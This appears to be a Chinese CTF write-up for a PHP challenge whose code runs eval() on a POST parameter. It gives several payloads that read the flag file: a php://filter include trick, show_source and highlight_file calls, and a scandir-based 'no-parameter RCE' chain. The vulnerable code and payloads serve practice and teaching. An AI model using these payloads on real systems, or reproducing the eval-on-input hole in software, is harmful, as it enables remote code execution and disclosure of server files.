```
 <?php

/*
# -*- coding: utf-8 -*-
# @Author: Lazzaro
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-07 22:02:47
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
}else{
    highlight_file(__FILE__);
}

```

同上



### 第一种

嵌套include

```
c=include$_POST[a]?>&a=php://filter/convert.base64-encode/resource=flag.php
```

![image-20250404151918218](./assets/image-20250404151918218.png)

![image-20250404151931157](./assets/image-20250404151931157.png)





### 第二种

show_source()

```
c=show_source("flag.php");
```

![image-20250404151956097](./assets/image-20250404151956097.png)

highlight_file()

```
c=highlight_file("flag.php");
```

![image-20250404152018594](./assets/image-20250404152018594.png)





### 第三种

参考无参rce

```
c=var_dump(scandir(getcwd()));
```

![image-20250404152114633](./assets/image-20250404152114633.png)

```
c=show_source(next(array_reverse(scandir(getcwd()))));
```

![image-20250404152156130](./assets/image-20250404152156130.png)